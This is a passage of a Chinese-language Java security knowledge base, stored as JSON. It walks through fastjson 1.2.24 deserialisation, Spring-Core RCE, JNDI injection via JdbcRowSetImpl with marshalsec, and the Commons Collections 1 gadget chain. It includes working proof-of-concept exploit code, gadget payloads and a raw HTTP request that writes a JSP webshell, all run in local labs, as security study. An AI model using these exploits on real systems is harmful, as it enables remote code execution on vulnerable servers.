"},"知识库/02.JAVA安全/16.fastJson反序列化原理及利用/":{"url":"知识库/02.JAVA安全/16.fastJson反序列化原理及利用/","title":"16.fastJson反序列化原理及利用","keywords":"","body":"引入fastJson 1.2.24 环境：jdk8u181 为了方便切换fastjson的各个版本，我创建一个maven项目，在pom.xml引入FastJson junit junit 4.11 test com.alibaba fastjson 1.2.24 然后写一个简单的javaBean package com.aaron.test; public class User { private String name; private String age; public String getName() { System.out.println(\"getName is running!\"); return name; } public void setName(String name) { System.out.println(\"SetName is running!\"); this.name = name; } public String getAge() { return age; } public void setAge(String age) { this.age = age; } @Override public String toString(){ return \"User{\" + \"name='\" + name + '\\'' + ',' + \"age='\" + age + '\\'' + '}'; } } 在以上基础上，构建一个Main类，使用fastjson来解析 package com.aaron.test; import com.alibaba.fastjson.JSON; public class Main { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"com.aaron.test.User\\\", \\\"name\\\":\\\"aaron\\\",\\\"age\\\":\\\"23\\\"}\"; Object obj = JSON.parse(json); System.out.println(obj); } } 运行main方法 fastjson 会解析该字符串，将其解析成object，就可以看到解析完成之后的User{name='aaron', age='23'}，在这个过程中，SetName 方法是被调用了 上面代码中输出的是一个Object类型的对象，但是从输出结果中看到该Object对象已经被解析为了User类型的对象。这就是json数据中的@type属性起的作用， Fastjson支持在json数据中使用@type属性指定该json数据被反序列为什么类型的对象。 同时控制台也输出了 SetName is running! ， 说明在反序列化对象时，会执行javabean的setter方法为其属性赋值。 调试 调试fastjson可让我花了不少力气，虽然我们都知道触发漏洞是在getter/setter处，fastjson会直接反射需要反序列化的类，并调用setter方法进行赋值，但是这个调试真是太麻烦了！ 那么就开始调试！我丢！ 强制进入parse函数 首先进入之后就会调用parse()函数，继续进入parse()函数 依次步进，在这里又调用了parser对象的parse方法，继续进入 继续进入parse函数 单步运行，直到case 12，这里调用了parseObject函数，继续进入 进入parseObject函数，继续单步 在这里调用了deserializer实例方法的deserializer函数，看这个函数有点像，而且还传入了this(分析上下文应该是传入待解析的json)，clazz，还有filedname，这里其实clazz已经从@type处已经找到字节码了 进入deserializer方法，在这里有个巨坑，强制进入都一直进不去，我只有手动进入，艹！ 第一次手动进入，就到下面这个函数，这个函数继续手动进入deserializer函数 到这个函数，打上断点才可以继续调试 继续单步，不知道走了多少步。。。到了这里，刚刚就是在拆解json字符串，把key和Object构造好 然后进入parseField函数 单步运行到执行parseField方法处，艹，他妈的！再进入 继续单步，经过一系列的if...else...终于看到点希望，我擦，直到看到了setValue函数，艹 我们进入setValue函数，可以看到这里将value，fieldInfo都传进来了 然后通过反射,去取相对应的setter方法 Method method = this.fieldInfo.method 如果存在setter方法 则直接调用该方法赋值 然后就到我们的setter方法这儿，就会打印SetName is running! 调这几把玩意人给调傻了，在deserializer方法，一直无法进入，手工进入找到调用的方法后才进行下一步 结论 调试完毕之后，就可以得到结论 fileldinfo中包含JavaBean的属性名称（private）及其setter，getter等method方法，然后通过反射调用setter方法进行赋值 当JavaBean存在属性为AtomicInteger、AtomicLong、AtomicBoolean、Map或Collection类型，且fieldinfo.getOnly值为true时（当javabean的属性没有setter方法，只有getter方法时，该值为true），在反序列化时会调用该属性的getter方法测试 在setValue函数中，我们可以看到，this.fieldInfo满足私有属性（private)且getOnly的时候，意思是只存在getter方法，不存在setter方法的时候，且类型为AtomicInteger，AtomicLong，AtomicBoolean，Map，Collection的时候，会直接调用getter方法，这里我用AtomicInteger示例 // javaBean public class User { private String name; private String age; private AtomicInteger test; public AtomicInteger getTest() { try{ Runtime.getRuntime().exec(\"gnome-calculator\"); }catch (Exception e){ e.printStackTrace(); } return test; } } // Main package com.aaron.test; import com.alibaba.fastjson.JSON; public class Main { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"com.aaron.test.User\\\",\\\"test\\\":12,\\\"name\\\":\\\"aaron\\\",\\\"age\\\":\\\"23\\\"}\"; Object obj = JSON.parse(json); System.out.println(obj); } } 运行结果如下图所示，我在此处执行了getter方法，而我的getter方法里却实现了弹出计算器的命令执行代码，当invoke之后，调用getter方法，执行命令 通过getter触发gadget 测试类选择TemplatesImpl，首先探测可用于触发getter gadgets，如下图所示，可以看到_auxClasses，_outputProperties属性是map类，首先满足第一条件，继续寻找是否只有getter方法 在这里可以看到满足条件的两个属性_auxClasses，_outputProperties，只有_outputProperties属性是存在getter方法 我最初是在网上找了一个复现poc public class TemplatesImplTest { public static void main(String[] args) throws Exception { String className = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; // 获取Exec的字节码 String byteCode = FileTools.getEvil(Class.forName(\"com.fastjson.tools.Exec\")); String json = \"{\\\"@type\\\":\\\"\" + className + \"\\\",\" + \"\\\"_bytecodes\\\":[\\\"\" + byteCode + \"\\\"],\" + \"'_name':'',\" + \"'_tfactory':{},\" + \"\\\"_outputProperties\\\":{},\" + \"\\\"_name\\\":\\\"\\\",\" + \"\\\"_version\\\":\\\"\\\",\" + \"\\\"allowedProtocols\\\":\\\"\\\"}\"; System.out.println(json); // 设置反序列化时对类的私有属性进行赋值 JSON.parse(json, Feature.SupportNonPublicField); } } 当时我也没有想通，为什么要有这些参数，通过反射看了构造函数，以及找了很多很多文章学习，也没有发现什么共同点，直到最后靠自己调试！卧槽，真他妈疯了，又搞了一下午，不过总得来说，自己总结学习到的东西还是很有帮助的。 首先我们知道，fastjson会根据json字符串遍历key，然后再调用getter/setter赋值操作 然后，我们利用的方式是getOnly，只有getter方法，没有setter方法 最后，在invoke之后，TemplatesImpl具体又执行了什么呢？ 我在这里做一个测试，在invoke之后强制进入找找问题所在，我把json数据改成如下所示，将_tfactory，_outputProperties换一个位置 String json = \"{\\\"@type\\\":\\\"\" + className + \"\\\",\" + \"\\\"_bytecodes\\\":[\\\"\" + byteCode + \"\\\"],\" + \"'_name':'',\" + \"\\\"_outputProperties\\\":{},\"+ \"'_tfactory':{}}\"; 然后再进行调试，我们着重看outputProperties触发处，在invoke处进入 然后我们可以看到，这里要进行了newTransformer()，在这里请注意我们要反序列化的字符串的顺序，此时_bytecodes，_name，已经完成赋值，但是，_tfactor，_outputProperties还未赋值，此时我们进入newTransforemer()方法 在这里我们要实例化的transformer，需要传入参数，但是_tfactor是null 我们进入getTransletInstance()函数，this中，_class[_transletIndex] 是初始化的数组，因为_transletIndex = -1了，还有待传入的_tfactor为null，可以看到_class=null，要执行defineTransletClasses()方法，进入该方法 当我继续向下执行的时候，就直接捕获异常了 那么我将_tfactor 和 _outputProperties更换位置呢？先让_tfactor取到值，再进行下一步实例化呢？ 这里就直接进入try代码块了 执行完defineTransletClasses()，之后，得到了_class[_transletIndex] 为我们写入的恶意字节码 然后再对_class[_transletIndex]进行实例化(newInstance()) 即可加载恶意构造函数 getter gadget链路 当反序列化com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类时，由于_outputProperties 属性是Map属性，且该属性只有getter方法，没有setter方法，因此会有如下的调用链 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties() => new Transformer() => getTranslateInstance() => defineTransletClasses()，到了这里，会读取_bytecodes[]属性中的字节码，然后在判断是否是继承于AbstractTranslet类 最后调用newInstance()方法实例化该类的对象，该方法是调用该类的缺省构造函数实例化对象 虽然上面的测试代码给_byteCodes 属性传入的字节码是经过base64编码的，但是在defineTransletClasses()方法中加载字节码之前，在com.alibaba.fastjson.parser.JSONScanner.bytesValue()方法中，已经将其解码了 通过setter方法触发gadget 我们使用JdbcRowSetImpl 类，这里用的就是JDNI注入，具体可以看JNDI注入之com.sun.rowset.JdbcRowSetImpl 利用链 这里我简单写一下客户端的代码 package com.aaron.test; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; public class TemplatesImplTest { public static void main(String[] args)throws Exception { String className = \"com.sun.rowset.JdbcRowSetImpl\"; String ldapPath = \"ldap://127.0.0.1:1389/aa\"; String json = \"{\\\"@type\\\":\\\"\"+className+\"\\\" ,\"+ \"\\\"dataSourceName\\\":\\\"\"+ldapPath+\"\\\",\"+ \"\\\"autoCommit\\\":true\"+ \"}\"; System.out.println(json); JSON.parse(json, Feature.SupportNonPublicField); } } Setter gadget 链路 链路很简单了 在对com.sun.rowset.JdbcRowSetImpl类反序列化时，会先执行dataSourceName属性的setter方法，给dataSourceName属性赋值为ldap://127.0.0.1:1099/XX，然后执行autoCommit属性的setter方法，有如下调用链： setAutoCommit() --> connect() --> ctx.lookup(getDataSourceName())，这里就造成了JNDI注入 通过marshalsec工具启动一个ldap服务，再启一个web服务专门放字节码，然后客户端就可以下载恶意字节码，完成JNDI注入 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:27:31 "},"知识库/02.JAVA安全/17.Spring-Core RCE/":{"url":"知识库/02.JAVA安全/17.Spring-Core RCE/","title":"17.Spring-Core RCE","keywords":"","body":"环境搭建 docker pull vulfocus/spring-core-rce-2022-03-29 启动环境 docker run -it -d --name springrce -p 192.168.93.131:9000:8080 vulfocus/spring-core-rce-2022-03-29 访问192.168.93.131:9000 出现如下界面则说明环境搭建成功 漏洞复现 当前docker 环境中，jdk版本为9.0 POST / HTTP/1.1 Host: 192.168.93.131:9000 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 685 suffix: %> prefix: \")%3b+while((a%3din.read(b))!%3d-1){+out.println(new+String(b))%3b+}+out.print(\"\")%3b%25%7bsuffix%7di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=./webapps/ROOT/&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat 问题总结 目前看效果只能写一次，发送过1次payload之后，是不能向其他目录下写新文件 发送一次payload之后之后，只能向文件里追加，不会覆盖文件 如果没有容器化部署（tomcat war包部署），是写不了webshell，虽然还没捋清楚是否是代码执行，如果是代码执行，那么可以在运行态中写入内存马达到作用，如果是命令执行，那么是不行的（看payload的样子感觉是命令执行pipeline） 如果是以jar包部署，那么考虑到启动jar包的用户权限，一般不会太高，在做了最小权限法的服务器，启动web服务的用户是没有家目录，导致无法写入公钥，也没权限写入计划任务 post包最后也就是第15行后不要有回车，不然生成的文件是shell$\\r\\n.jsp 目前看很鸡肋 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:44:48 "},"知识库/02.JAVA安全/18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链/":{"url":"知识库/02.JAVA安全/18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链/","title":"18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链","keywords":"","body":"com.sun.rowset.JdbcRowSetImpl 目前要进行jndi注入，需要满足两个条件，在受害者要存在以下代码，且uri可控 String uri = \"xxx\"; Context ctx = new InitialContext(); ctx.lookup(uri); com.sun.rowset.jdbcRowSetImpl，是fastjson反序列化漏洞触发jndi注入的一环 查看jdbcRowSetImpl，我们客户端这样写 JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();//只是为了方便调用 JdbcRowSetImpl_inc.setDataSourceName(\"rmi://127.0.0.1:1099/aa\"); JdbcRowSetImpl_inc.setAutoCommit(true); 运行起来报错是jndi unable connect，web服务也没有收到请求，客户端更不会执行恶意的字节码， 打断点调试，从而也进一步分析 jdk 版本8u181 我们在setAutoCommit(true)处打断点，强制进入可以看见如下代码 // JdbcRowSetImpl.java public void setAutoCommit(boolean var1) throws SQLException { if (this.conn != null) { //不进入 this.conn.setAutoCommit(var1); } else { this.conn = this.connect(); // 进入此处,进行连接 this.conn.setAutoCommit(var1); // 设置autoCommit为true } } 在这里我们会进行下一步连接，我们继续看，325，326 行不就是标准的jndi注入吗？ 存在new InitialContext()，且lookup(this.getDataSourceName)，DataSourceName在初始的时候是setDataSourceName的，该值我们也是可控的 // JdbcRowSetImpl.java connect() 关键代码 private Connection connect() throws SQLException { if (this.conn != null) { return this.conn; } else if (this.getDataSourceName() != null) { try { InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); //强制进入lookup，查看无法执行的原因 return this.getUsername() != null && !this.getUsername().equals(\"\") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection(); } catch (NamingException var3) { throw new SQLException(this.resBundle.handleGetObject(\"jdbcrowsetimpl.connect\").toString()); } } else { return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null; } } 又回到最开始调试JNDI注入的lookup处，我们继续跟进，进入lookup 再次进入lookup 进入decodeObject 走到这里发现居然抛出了错误，但是却看不见，这个错误也就是jdk8u181 的codebase错误，需要设置 trustURLCodebase为true 可以看到没有调用NamingManager.getObjectInstance函数，直接异常捕获了 最后在这里直接close掉，所以并没有去获取到恶意字节码，就直接关闭连接了 为了避免这个尴尬局面，我在客户端设置属性 System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\");再来尝试一下， 发现设置codebase为true之后，就可以下载恶意字节码，并实例化执行constructor函数，弹出计算器 在实际渗透中，一般使用marshalsec启动rmi或者ldap 下载marshalsec,查看marshalsec.jndi.RMIRefServer 文件，启动参数即是 codebase_url#classname port 默认端口是1099 使用工具效果如下 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:45:43 "},"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/01.Commons Collections 1 分析前置知识.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/01.Commons Collections 1 分析前置知识.html","title":"01.Commons Collections 1 分析前置知识","keywords":"","body":"简介 Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。 了解反射机制的话，我们会发现若存在一个固有的反射机制时，输入可控，就可能形成任意函数调用的情况，具有极大的危害。但实际上真的有存在这种情况：这就是commons-collections-3.1 jar包，cve编号：cve-2015-4852 在开始之前我们需要理一下反序列化漏洞的攻击流程： 客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码） exp发送到服务端，进入一个服务端自主复写（也可能是也有组件复写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层） 这个恶意数据exp_1在接下来的处理流程(可能是在自主复写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函数处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3...... 最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。 那么以上大概可以分成三个主要部分： payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；我把它称为：payload 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链) readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称...）commons-collections-3.1 首先来看看commons-collections项目吧 官网第一段： Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。 Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。 它是一个基础数据结构包，同时封装了很多功能，其中我们需要关注一个功能： Transforming decorators that alter each object as it is added to the collection 转化装饰器：修改每一个添加到collection中的object Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。 org.apache.commons.collections.Transformer这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是在于这个点。 漏洞复现需要下载3.1版本源码3.1版本的下载地址,进去寻觅一下源码和jar包都有。 由于没有找到漏洞版本3.1的api说明，我们可以参考3.2.2的api文档 首先创建一个项目，将已下载的Commons-Collections-3.1.jar 导入到项目中，如下所示 POC分析 这里是啦啦0咯咯 大哥提供的poc，在导入了Commons-Collections-3.1.jar的包之后，就能执行成功了 import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式 onlyElement.setValue(\"foobar\"); } } 执行效果如下 Runtime.getRuntime().exec(\"calc.exe\"); 以上代码包含了三要素中的前两项： payload 反序列化链 为什么没有readObject复写利用点？ 这个poc的复写利用点是sun.reflect.annotation.AnnotationInvocationHandler的readObject() 但是我们先精简payload和利用链，最后再加上readObject复写点 调试 调试以上poc，得到两种调用栈 Map.Entry Map.Entry 其实就是键值对的数据格式，其中setValue函数如下 // AbstractInputCheckedMapDecorator.class public Object setValue(Object value) { value = this.parent.checkSetValue(value); return super.entry.setValue(value); } TransformedMap TransformedMap是一种重写map类型的set函数和Map.Entry类型的setValue函数去调用转换链的Map类型。 // TransformedMap.class protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; } 首先看他的构造函数，所对应实例化outerMap，Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 其中对应的如下函数对应的this.valueTransformer 就是传入的transformerChain，而transformerChain 就是定义的transformers数组 // TransformedMap.class protected Object checkSetValue(Object value) { return this.valueTransformer.transform(value); } ChainedTransformer.class 由于TransformedMap具有commons_collections的转变特性，当赋值一个键值对的时候会自动对输入值进行预设的Transformer的调用。 // ChainedTransformer.class public Object transform(Object object) { for(int i = 0; i transform()函数是一个接口函数，在上面的循环中进入了不同的函数 ConstantTransformer.class // ConstantTransformer.class public Object transform(Object input) { return this.iConstant; } InvokerTransformer.class 再是进入了InvokerTransformer.class，看到这个就会发现有点东西了 // InvokerTransformer.class public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException var6) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException var7) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); } } } 很明显的反射机制，可见InvokerTransformer就是我们的触发任意代码执行处，我们看看源码中的文件描述 先看看我们需要关注的InvokerTransformer类的描述（在jar包中是找不到描述信息的，可以通过下载官方源码得到）： 我们可以这里有经典的反射机制调用，在细节分析前我们先整理一下调用栈，但不需要很理解。 Map.Entry 类型setValue(\"foobar\") => AbstracInputCheckedMapDecorator.setValue() => TransformedMap.checkSetValue() => ChainedTransformer.transform(Object object) 根据数组，先进入 => ConstantTransformer.transform(Object input) 再进入 => InvokerTransformer.transform(Object input) 参考链接 https://xz.aliyun.com/t/7031#toc-8 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:28:55 "},"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/02.Commons Collections 1 分析利用.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/02.Commons Collections 1 分析利用.html","title":"02.Commons Collections 1 分析利用","keywords":"","body":"前一篇讲了Commons Collections1的前置知识，三要素有payload，反序列化利用链，可重写的readObject方法 重构POC 首先明确最终目的是要执行命令，也就是说执行Runtime.getRuntime.exec(\"\") Runtime.getRuntime：获取一个Runtime实例 exec：调用实例的exec函数 因为漏洞函数最后是通过反射机制调用任意这个语句先转化成反射机制如下（后面需要用到）： Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")),\"calc.exe\") InvokerTransformer 回看反射机制触发函数InvokerTransformer类的transform(Object input) public Object transform(Object input) { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } 通过构造反射机制以及以上代码进行填空，可以得出当变量等于以下值，可以形成命令执行 // Object input input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); this.iMethodName = \"exec\"; this.iParamTypes = String.class; this.iArgs = \"calc.exe\"; 那么在InvokerTransformer类源码中我们可以找到赋值 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } 我们就可以构建以下测试代码直接调用InvokerTransformer通过反射执行任意命令： 下面开始试一下： package com.myproject; import org.apache.commons.collections.functors.InvokerTransformer; public class test { public static void main(String[] args) throws Exception { InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class},new Object[]{\"calc.exe\"}); Object input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); invokerTransformer.transform(input); } } 在这里执行了命令，然后我们再来模拟一下利用情景 为了方便，攻击者受害者写在同一函数 使用文件写入，代替网络传输 由于InvokerTransformer继承了Serializable类，是可以成功序列化的 再来尝试一下，使用IO操作，模拟网络IO操作 package com.myproject; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; public class test { public static void main(String[] args) throws Exception { //1.客户端构造序列化payload，使用写入文件模拟发包攻击 InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class},new Object[]{\"calc.exe\"}); FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(invokerTransformer); //2.服务端从文件中读取payload模拟接受包，然后触发漏洞 //服务端反序列化payload读取 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); //神奇第一处：服务端需要自主构造恶意input Object input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); //神奇第二处：服务端需要将客户端输入反序列化成InvokerTransformer格式，并在服务端自主传入恶意参数input InvokerTransformer invokerTransformer_in = (InvokerTransformer) objectInputStream.readObject(); invokerTransformer_in.transform(input); } } 在此时我们会发现如果我们要利用这个反射机制作为漏洞的话，需要开发人员帮助我们做以下事儿： 写一个payload作为input 接收客户端输入的参数，反序列化成InvokerTransformer类 再刻意调用InvokerTransformer的transform函数 这种是根本行不通的，所以就面临一些问题： payload需要再客户端可以自定义构造，再传入服务端 服务端需要把我们传入的exp反序列化成一个在代码中可能使用到的类 代码在正常操作中会调用这个类中一个可触发漏洞的函数（当然这个函数最后会进入到InvokerTransformer类的transform函数，从而形成命令执行） 如果这个反序列化的类和这个类触发命令执行的方法可以在一个readObject复写函数中恰好触发，那么就对服务端上下文没有要求了！ 假设如预期这样，是对服务端上下文没有要求，因为只要执行readObject就肯定会命令执行，不需要其他上下文，但是对于服务端版本环境是有要求的（JDK1.7） ChainedTransformer 关注 ChainedTransformer 类，首先看以下这个类的描述 /** * Transformer implementation that chains the specified transformers together. * * The input object is passed to the first transformer. The transformed result * is passed to the second transformer and so on. * * @since Commons Collections 3.0 * @version $Revision: 1.7 $ $Date: 2004/05/16 11:36:31 $ * * @author Stephen Colebourne */ public class ChainedTransformer implements Transformer, Serializabl{} 这个类会把我们的Transformer变成一个串，再逐一执行，其中这个操作对应就是Commons Collections1的前置知识中说的ChainedTransformer.transform函数 public Object transform(Object object) { for(int i = 0; i 在这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果 首先确定iTransformers可控，iTransformers数组是通过ChainedTransformer类的构造函数赋值的 public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } 那么可以知道的是，可以自定义iTransformers的内容，已有如下条件 // 最终执行目标 Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")),\"calc.exe\"); // InvokeTransformer关键语句 public Object transform(Object input) { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } 在看到InvokeTransformer代码的时候，我们需要引出一个注意点： 这里需要注意input.getClass()这个方法使用上的一些区别 当input是一个类的实例对象，获取到的是这个类 当input是一个类时，获取到的是java.lang.Class 验证如下 Object a = Runtime.getRuntime(); Class b = Runtime.class; System.out.println(a.getClass()); System.out.println(b.getClass()); //结果 //class java.lang.Runtime //class java.lang.Class 基于之前写的代码 InvokerTransformer a = new InvokerTransformer( \"exec\", new Class[]{String.class}, new String[]{\"calc.exe\"}); Object input=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); 我们可以知道input为Runtime类的对象，所以cls就是Runtime类，所以cls.getMethod可以找到exec方法，直接调用 首先将a封装成ChainedTransformer格式，但是payload还在外面 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Object input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); chainedTransformer.transform(input); } } 这里其实就是对如下的还原 Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")),\"calc.exe\"); 把payload放入Transformer数组中，需要转化成特定的Transformer格式才行 ConstantTransformer 在ConstantTransformer类中它同样继承了Transformer，可以看到它的transform函数是会返回this.iConstant，然而this.iConstant在构造函数中是等于我们传入的值，也就是说构造函数会写入这个变量，它的transform函数又会返回这个变量 public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } 所以我们可以把Runtime的实例写入到这个变量中 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ // new ConstantTransformer(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))), new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(null); // 此处输入可以为任意值，因为不会被使用到，因为Runtime实例被我们写入了this.iTransformers数组中 } } 那么模拟以下序列化与反序列化的过程 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); // 客户端序列化写成文件 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(transformerChain); // 服务端反序列化payload 读取 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); 